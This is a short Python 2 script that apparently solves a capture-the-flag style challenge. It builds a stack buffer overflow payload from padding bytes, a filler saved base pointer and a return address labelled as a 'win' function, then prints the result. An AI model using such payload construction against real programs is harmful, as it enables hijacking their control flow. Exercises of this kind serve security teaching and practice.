import struct

padding =  "A"*72 # gibberish
ebp = "A"*4 # gibberish
eip = struct.pack("I", 0x080483f4) # address of win
print padding + ebp + eip
